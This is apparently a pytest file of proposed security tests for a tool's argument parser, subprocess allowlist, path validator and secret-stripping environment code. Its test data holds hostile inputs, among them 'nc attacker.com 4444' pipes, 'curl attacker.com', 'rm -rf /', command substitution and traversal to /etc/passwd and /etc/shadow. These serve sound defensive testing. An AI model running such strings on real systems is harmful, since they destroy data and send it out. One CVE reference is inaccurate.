"""Additional security tests for Phase 1 implementations.

This document contains the missing test cases identified in the coverage analysis.
Organized by priority and module for systematic implementation.

Usage:
    Copy test functions to appropriate test files:
    - Priority 1 -> tests/security/test_*.py (implement immediately)
    - Priority 2 -> tests/security/test_*.py (implement before production)
    - Priority 3 -> tests/security/test_*.py (implement for comprehensive coverage)

Author: Test Coverage Review Specialist
Date: 2025-02-02
"""

import pytest
import os
import tempfile
import threading
import time
from pathlib import Path
from session_buddy.mcp.tools.session.crackerjack_tools import _parse_crackerjack_args
from session_buddy.utils.subprocess_helper import SafeSubprocess, _get_safe_environment
from session_buddy.utils.path_validation import PathValidator, validate_working_directory
from session_buddy.utils.git_operations import _validate_prune_delay

# =============================================================================
# PRIORITY 1 - CRITICAL (Implement Before Phase 2)
# =============================================================================

# -----------------------------------------------------------------------------
# Command Injection Prevention - Priority 1 Tests
# -----------------------------------------------------------------------------

def test_parse_crackerjack_args_newline_injection():
    """Test newline characters are blocked in arguments.

    SECURITY: Newlines can be used to inject commands in shell contexts.
    Risk: HIGH - newline injection can break command parsing.

    CVE Reference: Similar to CVE-2021-44228 (Log4Shell newline injection)
    """
    # Unix newline
    with pytest.raises(ValueError, match="unsafe argument"):
        _parse_crackerjack_args("--verbose\n--quiet")

    with pytest.raises(ValueError, match="unsafe argument"):
        _parse_crackerjack_args("--verbose\r\nmalicious")

    # Carriage return
    with pytest.raises(ValueError, match="unsafe argument"):
        _parse_crackerjack_args("--verbose\rmalicious")

    # Multiple newlines
    with pytest.raises(ValueError, match="unsafe argument"):
        _parse_crackerjack_args("\n\n\rmalicious")


def test_parse_crackerjack_args_tab_injection():
    """Test tab characters are blocked in arguments.

    SECURITY: Tabs can be used for argument confusion attacks.
    Risk: HIGH - tabs can separate arguments in unexpected ways.
    """
    # Tab character
    with pytest.raises(ValueError, match="unsafe argument"):
        _parse_crackerjack_args("--verbose\tmalicious")

    # Multiple tabs
    with pytest.raises(ValueError, match="unsafe argument"):
        _parse_crackerjack_args("\t\tmalicious")

    # Tab with newline
    with pytest.raises(ValueError, match="unsafe argument"):
        _parse_crackerjack_args("--verbose\n\tmalicious")


def test_parse_crackerjack_args_argument_overflow():
    """Test extremely long arguments are rejected (DoS prevention).

    SECURITY: Argument overflow can cause buffer overflows or DoS.
    Risk: HIGH - long arguments can exhaust memory or cause crashes.

    Reference: CWE-770 - Allocation of Resources Without Limits
    """
    # 10KB argument (should be OK)
    long_arg = "A" * 10_000
    result = _parse_crackerjack_args(f"--output {long_arg}")
    assert long_arg in result

    # 100KB argument (potential DoS)
    long_arg = "A" * 100_000
    with pytest.raises(ValueError, match="too long|oversized"):
        _parse_crackerjack_args(f"--output {long_arg}")

    # 1MB argument (definite DoS)
    long_arg = "A" * 1_000_000
    with pytest.raises(ValueError, match="too long|oversized"):
        _parse_crackerjack_args(f"--output {long_arg}")


# -----------------------------------------------------------------------------
# Subprocess Safety - Priority 1 Tests
# -----------------------------------------------------------------------------

def test_run_safe_empty_command():
    """Test empty commands are rejected.

    SECURITY: Empty commands can bypass allowlist checks.
    Risk: CRITICAL - empty command validation bypass.
    """
    # Empty list
    with pytest.raises(ValueError, match="Empty command"):
        SafeSubprocess.run_safe([], allowed_commands={"echo"})

    # List with empty string
    with pytest.raises(ValueError, match="Empty command"):
        SafeSubprocess.run_safe([""], allowed_commands={"echo"})

    # List with only whitespace
    with pytest.raises(ValueError, match="Empty command|not allowed"):
        SafeSubprocess.run_safe(["   "], allowed_commands={"echo"})


def test_run_safe_argument_injection():
    """Test shell injection in validated command arguments is blocked.

    SECURITY: Arguments can contain injection even if command is safe.
    Risk: CRITICAL - command injection through arguments.

    Attack Vector:
        echo "test; rm -rf /"  # ; can start new command in shell
    """
    # Semicolon injection
    with pytest.raises(ValueError, match="Shell metacharacter"):
        SafeSubprocess.run_safe(
            ["echo", "test; rm -rf /"],
            allowed_commands={"echo"}
        )

    # Pipe injection
    with pytest.raises(ValueError, match="Shell metacharacter"):
        SafeSubprocess.run_safe(
            ["echo", "test | nc attacker.com 4444"],
            allowed_commands={"echo"}
        )

    # Command substitution
    with pytest.raises(ValueError, match="Shell metacharacter"):
        SafeSubprocess.run_safe(
            ["echo", "$(whoami)"],
            allowed_commands={"echo"}
        )


def test_run_safe_absolute_path_blocked():
    """Test absolute path commands are blocked by allowlist.

    SECURITY: Absolute paths can bypass allowlist checks.
    Risk: HIGH - unauthorized command execution.

    Attack Vector:
        User provides: /bin/echo instead of echo
        Allowlist check passes for "echo" but executes /bin/echo
    """
    # Absolute path to allowed command
    with pytest.raises(ValueError, match="Command not allowed"):
        SafeSubprocess.run_safe(
            ["/bin/echo", "test"],
            allowed_commands={"echo"}
        )

    # Relative path with ./
    with pytest.raises(ValueError, match="Command not allowed"):
        SafeSubprocess.run_safe(
            ["./echo", "test"],
            allowed_commands={"echo"}
        )


def test_run_safe_concurrent_sanitization():
    """Test environment sanitization is thread-safe.

    SECURITY: Race conditions in sanitization can leak secrets.
    Risk: HIGH - concurrent access can bypass sanitization.

    Attack Scenario:
        Thread 1: Start sanitizing (remove secrets)
        Thread 2: Add secret to environment
        Thread 1: Finish sanitization (secret remains)
    """
    results = []
    errors = []

    def run_command_with_secret():
        """Add secret and run command concurrently."""
        os.environ[f"SECRET_{threading.get_ident()}"] = f"secret_{threading.get_ident()}"

        try:
            result = SafeSubprocess.run_safe(
                ["echo", "test"],
                allowed_commands={"echo"}
            )
            results.append(result)

            # Verify secret not leaked
            assert f"SECRET_{threading.get_ident()}" not in result.stdout

        except Exception as e:
            errors.append(e)
        finally:
            # Cleanup
            if f"SECRET_{threading.get_ident()}" in os.environ:
                del os.environ[f"SECRET_{threading.get_ident()}"]

    # Run 10 concurrent threads
    threads = [threading.Thread(target=run_command_with_secret) for _ in range(10)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()

    # Verify all succeeded
    assert len(errors) == 0, f"Errors occurred: {errors}"
    assert len(results) == 10


# -----------------------------------------------------------------------------
# Path Validation - Priority 1 Tests
# -----------------------------------------------------------------------------

def test_validate_user_path_null_byte_blocked():
    """Test null bytes in paths are blocked.

    SECURITY: Null bytes can bypass path checks on Windows.
    Risk: CRITICAL - path traversal bypass on Windows.

    Attack Vector:
        Path: /etc/passwd\x00.txt
        Validation sees: /etc/passwd.txt (safe)
        Filesystem sees: /etc/passwd (dangerous)

    Reference: CWE-158 - Null Byte Injection
    """
    validator = PathValidator()

    # Null byte at end (Windows bypass)
    with pytest.raises(ValueError, match="Null bytes"):
        validator.validate_user_path("/etc/passwd\x00.txt")

    # Null byte in middle
    with pytest.raises(ValueError, match="Null bytes"):
        validator.validate_user_path("/etc/\x00passwd")

    # Null byte with traversal
    with pytest.raises(ValueError, match="Null bytes"):
        validator.validate_user_path("safe\x00../etc/passwd")


def test_validate_user_path_overflow_blocked():
    """Test paths exceeding MAX_PATH_LENGTH are blocked.

    SECURITY: Long paths can cause buffer overflows or DoS.
    Risk: HIGH - path overflow crashes or bypasses checks.

    Reference: CWE-770 - Allocation of Resources Without Limits
    POSIX PATH_MAX = 4096
    """
    validator = PathValidator()

    # Path at boundary (should work)
    path_at_limit = "/tmp/" + "/a" * 4090
    assert len(path_at_limit) > 4096  # Ensure we're testing the limit
    with pytest.raises(ValueError, match="too long"):
        validator.validate_user_path(path_at_limit)

    # Path well over limit
    path_over_limit = "/tmp/" + "/a" * 10000
    with pytest.raises(ValueError, match="too long"):
        validator.validate_user_path(path_over_limit)


def test_validate_user_path_symlink_attack():
    """Test symlink validation prevents directory traversal attacks.

    SECURITY: Symlinks can bypass path validation checks.
    Risk: HIGH - symlink attacks allow unauthorized file access.

    Attack Scenario:
        1. User creates symlink: /tmp/safe -> /etc
        2. Validation checks: /tmp/safe is in /tmp (allowed)
        3. Operation accesses: /tmp/safe/passwd -> /etc/passwd

    Reference: CWE-59 - Improper Link Resolution Before File Access
    """
    validator = PathValidator()

    with tempfile.TemporaryDirectory() as tmpdir:
        tmpdir = Path(tmpdir)
        safe_link = tmpdir / "safe"

        # Create symlink to sensitive directory
        try:
            safe_link.symlink_to("/etc")

            # Should block access through symlink
            with pytest.raises(ValueError, match="escapes base directory"):
                validator.validate_user_path(
                    safe_link / "passwd",
                    base_dir=tmpdir
                )

        finally:
            # Cleanup
            if safe_link.exists() or safe_link.is_symlink():
                safe_link.unlink()


# =============================================================================
# PRIORITY 2 - HIGH (Implement Before Production)
# =============================================================================

# -----------------------------------------------------------------------------
# Command Injection Prevention - Priority 2 Tests
# -----------------------------------------------------------------------------

def test_parse_crackerjack_args_unicode_homograph():
    """Test Unicode look-alike characters are blocked.

    SECURITY: Unicode homographs can bypass allowlist checks.
    Risk: MEDIUM - visual confusion attacks.

    Attack Vector:
        User provides: －verbose (full-width dash)
        Allowlist sees: --verbose (allowed)
        Parser sees: －verbose (different character)

    Reference: CWE-156 - Homograph Attack
    """
    # Full-width dash (U+FF0D)
    with pytest.raises(ValueError, match="Blocked argument|unsafe"):
        _parse_crackerjack_args("－verbose")

    # Full-width letters (U+FF28\uff4e etc)
    with pytest.raises(ValueError, match="Blocked argument"):
        _parse_crackerjack_args("ｖｅｒｂｏｓｅ")


def test_parse_crackerjack_args_empty_values():
    """Test empty flag values are handled correctly.

    SECURITY: Empty values can cause unexpected behavior.
    Risk: LOW - functionality issue, not security.

    Edge Case:
        --severity="" (empty string)
        --output= (no value)
    """
    # Empty quoted string
    result = _parse_crackerjack_args('--severity=""')
    assert result == ["--severity", ""]

    # Empty value after equals
    result = _parse_crackerjack_args("--output=")
    assert result == ["--output", ""]

    # Verify empty string is preserved
    assert result[1] == ""


def test_parse_crackerjack_args_multiple_equals():
    """Test multiple equals signs are handled correctly.

    SECURITY: Malformed arguments can bypass validation.
    Risk: LOW - parser robustness.

    Edge Case:
        --key=value=extra
        --key==value
    """
    # Multiple equals in value
    result = _parse_crackerjack_args('--severity="high=medium"')
    assert result == ["--severity", "high=medium"]

    # Double equals
    result = _parse_crackerjack_args("--output==file.txt")
    assert result == ["--output", "=file.txt"]


def test_parse_crackerjack_args_flag_repetition():
    """Test flag repetition is handled correctly.

    SECURITY: Repeated flags can cause unexpected behavior.
    Risk: LOW - functionality issue.

    Edge Case:
        --verbose --verbose --verbose (should this be allowed?)
    """
    # Allow repetition (idempotent flags)
    result = _parse_crackerjack_args("--verbose --verbose --verbose")
    assert result == ["--verbose", "--verbose", "--verbose"]

    # Mixed flags with repetition
    result = _parse_crackerjack_args("-v -v -q")
    assert result == ["-v", "-v", "-q"]


# -----------------------------------------------------------------------------
# Subprocess Safety - Priority 2 Tests
# -----------------------------------------------------------------------------

def test_run_safe_large_output():
    """Test large subprocess output is handled correctly.

    SECURITY: Large output can exhaust memory (DoS).
    Risk: MEDIUM - resource exhaustion.

    Reference: CWE-770 - Allocation of Resources Without Limits
    """
    # Generate 10MB of output
    result = SafeSubprocess.run_safe(
        ["python", "-c", "print('A' * 10_000_000)"],
        allowed_commands={"python"}
    )

    # Should succeed without hanging
    assert result.returncode == 0
    assert len(result.stdout) >= 10_000_000


# -----------------------------------------------------------------------------
# Path Validation - Priority 2 Tests
# -----------------------------------------------------------------------------

def test_validate_user_path_toctou():
    """Test TOCTOU vulnerability is mitigated.

    SECURITY: Time-of-check to time-of-use race condition.
    Risk: HIGH - race condition allows bypass.

    Attack Scenario:
        1. Check: /tmp/safe is a directory (allowed)
        2. Attacker replaces: /tmp/safe -> symlink to /etc
        3. Use: /tmp/safe/passwd -> /etc/passwd

    Reference: CWE-367 - Time-of-Check Time-of-Use
    """
    validator = PathValidator()

    with tempfile.TemporaryDirectory() as tmpdir:
        tmpdir = Path(tmpdir)
        safe_path = tmpdir / "safe"

        # Create safe directory
        safe_path.mkdir()

        # Thread that replaces directory with symlink
        def replace_with_symlink():
            time.sleep(0.01)  # Small delay to let validation start
            try:
                safe_path.rmdir()
                safe_path.symlink_to("/etc")
            except (OSError, FileNotFoundError):
                pass  # Already validated or removed

        # Start attack thread
        t = threading.Thread(target=replace_with_symlink)
        t.start()

        try:
            # Validate path while another thread changes it
            result = validator.validate_user_path(safe_path)
            t.join()

            # If validation succeeded, verify it's actually safe
            assert not safe_path.is_symlink()
            assert safe_path.is_dir()

        except (ValueError, OSError) as e:
            # Expected: tampering detected
            t.join()
            assert "escapes" in str(e).lower() or "symlink" in str(e).lower()


def test_validate_user_path_mixed_separators():
    """Test mixed path separators are handled correctly.

    SECURITY: Mixed separators can bypass validation on some platforms.
    Risk: MEDIUM - cross-platform attack.

    Edge Case:
        ../..\\etc (Unix with Windows separator)
    """
    validator = PathValidator()

    # Unix-style with Windows components (should be blocked)
    with pytest.raises(ValueError, match="escapes base directory"):
        validator.validate_user_path("..\\..\\etc")


# -----------------------------------------------------------------------------
# Environment Sanitization - Priority 2 Tests
# -----------------------------------------------------------------------------

def test_environment_sanitization_edge_cases():
    """Test edge case variable names are handled correctly.

    SECURITY: Edge cases can bypass pattern matching.
    Risk: LOW - minor secret leak.

    Edge Cases:
        _PASSWORD (underscore prefix)
        PASSWORD_ (underscore suffix)
        PASSWORD_BACKUP (contains pattern)
        KEYHOLDER (contains KEY)
    """
    # Underscore prefix
    os.environ["_PASSWORD"] = "secret1"
    os.environ["PASSWORD_"] = "secret2"
    os.environ["PASSWORD_BACKUP"] = "backup"
    os.environ["KEYHOLDER"] = "keys"

    safe_env = _get_safe_environment()

    # Should block all PASSWORD-containing vars
    assert "_PASSWORD" not in safe_env
    assert "PASSWORD_" not in safe_env
    assert "PASSWORD_BACKUP" not in safe_env

    # KEYHOLDER should also be blocked (contains KEY)
    assert "KEYHOLDER" not in safe_env

    # Cleanup
    for var in ["_PASSWORD", "PASSWORD_", "PASSWORD_BACKUP", "KEYHOLDER"]:
        if var in os.environ:
            del os.environ[var]


def test_environment_sanitization_special_values():
    """Test special environment variable values are handled.

    SECURITY: Binary values can cause issues.
    Risk: LOW - encoding issues.

    Edge Cases:
        Empty value
        Binary value (non-UTF-8)
    """
    # Empty value
    os.environ["TEST_PASSWORD"] = ""
    safe_env = _get_safe_environment()
    assert "TEST_PASSWORD" not in safe_env

    # Cleanup
    del os.environ["TEST_PASSWORD"]


# -----------------------------------------------------------------------------
# Git Security - Priority 2 Tests
# -----------------------------------------------------------------------------

def test_prune_delay_command_injection():
    """Test command injection attempts are blocked in prune delay.

    SECURITY: Shell injection in git prune delay parameter.
    Risk: HIGH - command injection through git.

    Attack Vector:
        git gc --prune=2.weeks && rm -rf /
    """
    # Command substitution
    valid, msg = _validate_prune_delay("$(rm -rf /)")
    assert valid is False
    assert "Invalid" in msg

    # Shell injection
    valid, msg = _validate_prune_delay("; DROP TABLE users;")
    assert valid is False
    assert "Invalid" in msg

    # Backtick injection
    valid, msg = _validate_prune_delay("`reboot`")
    assert valid is False
    assert "Invalid" in msg

    # Pipe injection
    valid, msg = _validate_prune_delay("2.weeks | nc attacker.com 4444")
    assert valid is False
    assert "Invalid" in msg


def test_prune_delay_invalid_time_units():
    """Test invalid time units are rejected.

    SECURITY: Invalid time units can cause unexpected behavior.
    Risk: LOW - git will reject, but better to validate early.

    Edge Cases:
        2.centuries (not a git time unit)
        1.millenniums (not valid)
    """
    invalid_units = [
        "2.centuries",
        "1.millenniums",
        "5.lightyears",
        "1.decades",  # Not a git time unit
        "1.fortnights",
    ]

    for unit in invalid_units:
        valid, msg = _validate_prune_delay(unit)
        assert valid is False, f"Should reject {unit}: {msg}"
        assert "Invalid" in msg


def test_prune_delay_floating_point():
    """Test floating point values are rejected.

    SECURITY: Floating point can cause parsing issues.
    Risk: LOW - git will reject, but better to validate early.

    Edge Cases:
        2.5.weeks (only integers allowed)
        1.5.days
    """
    # Should reject (only integers allowed)
    valid, msg = _validate_prune_delay("2.5.weeks")
    assert valid is False

    valid, msg = _validate_prune_delay("1.5.days")
    assert valid is False


# =============================================================================
# PRIORITY 3 - MEDIUM (Implement for Comprehensive Coverage)
# =============================================================================

def test_parse_crackerjack_args_url_like_strings():
    """Test URL-like strings are handled correctly.

    SECURITY: URLs in arguments could be suspicious.
    Risk: LOW - data exfiltration concern.

    Edge Case:
        --output http://attacker.com/data
    """
    # HTTP URL (should be allowed as value)
    result = _parse_crackerjack_args("--output http://example.com/data")
    assert "http://example.com/data" in result


def test_parse_crackerjack_args_path_like_strings():
    """Test path-like strings are handled correctly.

    SECURITY: Path traversal in values could be suspicious.
    Risk: LOW - depends on how value is used.

    Edge Case:
        --output ../../../etc/passwd
    """
    # Path traversal as value (should be allowed)
    result = _parse_crackerjack_args("--output ../../../etc/passwd")
    assert "../../../etc/passwd" in result


def test_environment_sanitization_case_variations():
    """Test case-insensitive matching works correctly.

    SECURITY: Case variations must all be blocked.
    Risk: LOW - minor secret leak.

    Edge Cases:
        password (lowercase)
        Password (capitalized)
        PaSsWoRd (mixed case)
    """
    os.environ["password"] = "lower"
    os.environ["Password"] = "capitalized"
    os.environ["PaSsWoRd"] = "mixed"

    safe_env = _get_safe_environment()

    # All variations should be removed
    assert "password" not in safe_env
    assert "Password" not in safe_env
    assert "PaSsWoRd" not in safe_env

    # Cleanup
    for var in ["password", "Password", "PaSsWoRd"]:
        if var in os.environ:
            del os.environ[var]


def test_environment_sanitization_large_values():
    """Test large environment variable values are handled.

    SECURITY: Large values can exhaust memory (DoS).
    Risk: MEDIUM - resource exhaustion.

    Reference: CWE-770 - Allocation of Resources Without Limits
    """
    # 1MB value
    os.environ["TEST_PASSWORD"] = "X" * 1_000_000

    safe_env = _get_safe_environment()

    assert "TEST_PASSWORD" not in safe_env
    assert len(str(safe_env)) < 1_000_000  # Should be much smaller

    # Cleanup
    del os.environ["TEST_PASSWORD"]


# =============================================================================
# HELPER FUNCTIONS
# =============================================================================

def setup_sensitive_env():
    """Set up sensitive environment variables for testing."""
    os.environ["TEST_PASSWORD"] = "secret123"
    os.environ["TEST_TOKEN"] = "abc123"
    os.environ["API_KEY"] = "key123"


def cleanup_sensitive_env():
    """Clean up sensitive environment variables after testing."""
    for var in ["TEST_PASSWORD", "TEST_TOKEN", "API_KEY"]:
        if var in os.environ:
            del os.environ[var]


# =============================================================================
# TEST DATA
# =============================================================================

# Command Injection Test Data
INJECTION_STRINGS = [
    # Shell metacharacters
    "; rm -rf /",
    "&& curl attacker.com",
    "| nc attacker.com 4444",
    "$(whoami)",
    "`reboot`",
    "\n malicious",
    "\r\n malicious",
    "\t malicious",

    # Unicode attacks
    "－verbose",  # Full-width dash
    "ｓｔａｔｕｓ",  # Full-width letters

    # Overflow
    "A" * 100000,
    "A" * 1000000,
]

# Path Traversal Test Data
PATH_TRAVERSAL_STRINGS = [
    # Basic traversal
    "../etc/passwd",
    "..\\..\\..\\windows\\system32",
    "../../../../../etc/shadow",

    # Null bytes
    "/etc/passwd\x00.txt",
    "safe\x00../../etc/passwd",

    # Overflow
    "/tmp/" + "a" * 5000,

    # Mixed separators
    "../..\\etc",
    "..\\../etc",

    # Symlinks
    "/tmp/symlink_to_etc",
]

# Environment Variable Test Data
SENSITIVE_PATTERNS = [
    "PASSWORD", "TOKEN", "SECRET", "KEY",
    "CREDENTIAL", "API", "AUTH", "SESSION", "COOKIE",

    # Edge cases
    "_PASSWORD", "PASSWORD_", "PASSWORD_BACKUP",
    "KEYHOLDER", "KEYCHAIN", "PASSWORD_RESET",

    # Case variations
    "password", "Password", "PaSsWoRd",
]
